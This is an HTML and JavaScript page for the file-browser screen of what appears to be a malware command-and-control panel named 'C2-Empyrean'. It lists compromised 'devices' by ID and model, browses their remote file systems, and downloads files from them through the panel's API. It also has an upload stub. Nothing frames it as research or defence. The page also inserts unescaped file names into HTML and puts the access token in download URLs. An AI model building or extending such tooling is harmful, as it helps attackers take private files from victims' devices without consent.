<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Browser - C2-Empyrean</title>
    <link rel="stylesheet" href="/assets/css/dashboard.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
        }
        .app-container { display: flex; min-height: 100vh; }
        .sidebar {
            width: 260px;
            background: rgba(255, 255, 255, 0.02);
            border-right: 1px solid rgba(255, 255, 255, 0.05);
            padding: 24px 16px;
            position: fixed;
            top: 0; left: 0;
            height: 100vh;
            overflow-y: auto;
            z-index: 100;
        }
        .sidebar-logo {
            font-size: 22px; font-weight: 800;
            background: linear-gradient(135deg, #00d4ff, #7b2ff7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 32px; padding: 0 12px;
        }
        .sidebar-nav { list-style: none; }
        .sidebar-nav li { margin-bottom: 4px; }
        .sidebar-nav a {
            display: flex; align-items: center; gap: 12px;
            padding: 10px 12px; color: rgba(255, 255, 255, 0.5);
            text-decoration: none; border-radius: 10px;
            font-size: 14px; font-weight: 500; transition: all 0.2s ease;
        }
        .sidebar-nav a:hover { background: rgba(255, 255, 255, 0.05); color: rgba(255, 255, 255, 0.8); }
        .sidebar-nav a.active { background: rgba(123, 47, 247, 0.15); color: #7b2ff7; }
        .sidebar-nav .icon { width: 20px; text-align: center; font-size: 16px; }
        .sidebar-divider { border: none; border-top: 1px solid rgba(255, 255, 255, 0.05); margin: 16px 12px; }
        .sidebar-section-title { color: rgba(255, 255, 255, 0.2); font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1.5px; padding: 8px 12px; }

        .main-content {
            margin-left: 260px; flex: 1;
            padding: 28px 32px;
            max-width: calc(100vw - 260px);
        }

        .page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
        .page-title { font-size: 28px; font-weight: 700; color: #fff; }
        .page-title span { font-size: 14px; font-weight: 400; color: rgba(255, 255, 255, 0.3); }
        .header-actions { display: flex; gap: 12px; align-items: center; }
        .header-btn {
            padding: 8px 16px; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px;
            color: rgba(255, 255, 255, 0.7); font-size: 13px;
            cursor: pointer; transition: all 0.2s; text-decoration: none;
        }
        .header-btn:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }

        .browser-toolbar {
            display: flex; gap: 12px; align-items: center;
            margin-bottom: 20px; flex-wrap: wrap;
        }
        .device-select {
            padding: 10px 14px; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px;
            color: #fff; font-size: 13px; outline: none; min-width: 250px; cursor: pointer;
        }
        .device-select:focus { border-color: #7b2ff7; }
        .device-select option { background: #1a1a2e; }
        .path-bar {
            display: flex; align-items: center; gap: 4px;
            flex: 1; font-size: 13px; color: rgba(255, 255, 255, 0.4);
            background: rgba(255, 255, 255, 0.03);
            padding: 8px 14px; border-radius: 8px;
            font-family: 'JetBrains Mono', monospace;
            overflow-x: auto;
        }
        .path-bar .sep { color: rgba(255, 255, 255, 0.15); }
        .path-bar .dir-link { color: #7b2ff7; cursor: pointer; }
        .path-bar .dir-link:hover { text-decoration: underline; }

        .file-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 12px;
        }

        .file-item {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 12px;
            padding: 16px;
            cursor: pointer;
            transition: all 0.2s;
            text-align: center;
        }
        .file-item:hover { border-color: rgba(123, 47, 247, 0.3); background: rgba(123, 47, 247, 0.05); }
        .file-item .file-icon { font-size: 36px; margin-bottom: 8px; }
        .file-item .file-name { font-size: 13px; font-weight: 500; color: #fff; word-break: break-all; }
        .file-item .file-size { font-size: 11px; color: rgba(255, 255, 255, 0.3); margin-top: 4px; }
        .file-item .file-date { font-size: 10px; color: rgba(255, 255, 255, 0.2); }

        .empty-state { color: rgba(255, 255, 255, 0.2); text-align: center; padding: 60px 20px; grid-column: 1 / -1; }

        @media (max-width: 768px) {
            .sidebar { display: none; }
            .main-content { margin-left: 0; max-width: 100%; padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="app-container">
        <nav class="sidebar">[sidebar content same as other pages]</nav>

        <main class="main-content">
            <div class="page-header">
                <h1 class="page-title">📁 File Browser <span>remote file system</span></h1>
                <div class="header-actions">
                    <button class="header-btn" onclick="refreshFiles()">🔄 Refresh</button>
                    <button class="header-btn" onclick="uploadToDevice()">📤 Upload</button>
                </div>
            </div>

            <div class="browser-toolbar">
                <select class="device-select" id="deviceSelect" onchange="navigateTo('/')">
                    <option value="">Select a device...</option>
                </select>
                <div class="path-bar" id="pathBar">
                    <span style="color:rgba(255,255,255,0.2);">Select a device to browse</span>
                </div>
            </div>

            <div class="file-grid" id="fileGrid">
                <div class="empty-state">Select a device to view files</div>
            </div>
        </main>
    </div>

    <script>
        let selectedDeviceId = null;
        let currentPath = '/';

        document.addEventListener('DOMContentLoaded', loadDevices);

        async function loadDevices() {
            try {
                const response = await fetch('/api/devices/list?page=1&per_page=100', {
                    headers: { 'Authorization': 'Bearer ' + getCookie('access_token') }
                });
                const result = await response.json();
                if (!result.success) return;
                const select = document.getElementById('deviceSelect');
                select.innerHTML = '<option value="">Select a device...</option>' +
                    (result.data.devices || []).map(d =>
                        `<option value="${d.device_id}">${d.device_id} — ${d.model || 'unknown'}</option>`
                    ).join('');
            } catch (err) {}
        }

        async function navigateTo(path) {
            selectedDeviceId = document.getElementById('deviceSelect').value;
            currentPath = path || '/';
            if (!selectedDeviceId) return;

            try {
                const response = await fetch(`/api/files/list?device_id=${encodeURIComponent(selectedDeviceId)}&path=${encodeURIComponent(currentPath)}`, {
                    headers: { 'Authorization': 'Bearer ' + getCookie('access_token') }
                });
                const result = await response.json();
                if (!result.success) return;

                renderPathBar(result.data.path || currentPath);
                renderFiles(result.data.files || []);
            } catch (err) {}
        }

        function renderPathBar(path) {
            const bar = document.getElementById('pathBar');
            const parts = path.replace(/^\/|\/$/g, '').split('/').filter(Boolean);
            let html = '<span class="dir-link" onclick="navigateTo(\'/\')">~</span>';
            let cum = '';
            parts.forEach(p => {
                cum += '/' + p;
                html += ` <span class="sep">/</span> <span class="dir-link" onclick="navigateTo('${cum}')">${p}</span>`;
            });
            bar.innerHTML = html;
        }

        function renderFiles(files) {
            const grid = document.getElementById('fileGrid');
            if (files.length === 0) {
                grid.innerHTML = '<div class="empty-state">Empty directory</div>';
                return;
            }
            grid.innerHTML = files.map(f => {
                const isDir = f.type === 'dir' || f.is_dir;
                const icon = isDir ? '📁' : getFileIcon(f.name);
                const size = isDir ? '—' : formatSize(f.size);
                return `
                    <div class="file-item" onclick="${isDir ? `navigateTo('${f.path}')` : `downloadFile('${f.path}')`}">
                        <div class="file-icon">${icon}</div>
                        <div class="file-name">${f.name}</div>
                        <div class="file-size">${size}</div>
                        <div class="file-date">${f.modified || '—'}</div>
                    </div>
                `;
            }).join('');
        }

        function getFileIcon(name) {
            const ext = name.split('.').pop().toLowerCase();
            const map = { jpg:'🖼️', jpeg:'🖼️', png:'🖼️', gif:'🖼️', mp4:'🎬', mp3:'🎵', pdf:'📄', doc:'📝', docx:'📝', xls:'📊', zip:'📦', apk:'📱', php:'⚙️', js:'⚙️', html:'🌐', txt:'📄', db:'🗄️' };
            return map[ext] || '📄';
        }

        function formatSize(bytes) {
            if (!bytes) return '—';
            const units = ['B', 'KB', 'MB', 'GB'];
            let i = 0;
            let size = bytes;
            while (size >= 1024 && i < units.length - 1) { size /= 1024; i++; }
            return size.toFixed(1) + ' ' + units[i];
        }

        function refreshFiles() { navigateTo(currentPath); }
        function downloadFile(path) { window.open(`/api/files/download?device_id=${selectedDeviceId}&path=${encodeURIComponent(path)}&token=${getCookie('access_token')}`, '_blank'); }
        function uploadToDevice() { /* file upload dialog */ }
        function getCookie(name) {
            const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
            return match ? decodeURIComponent(match[2]) : null;
        }
    </script>
</body>
</html>
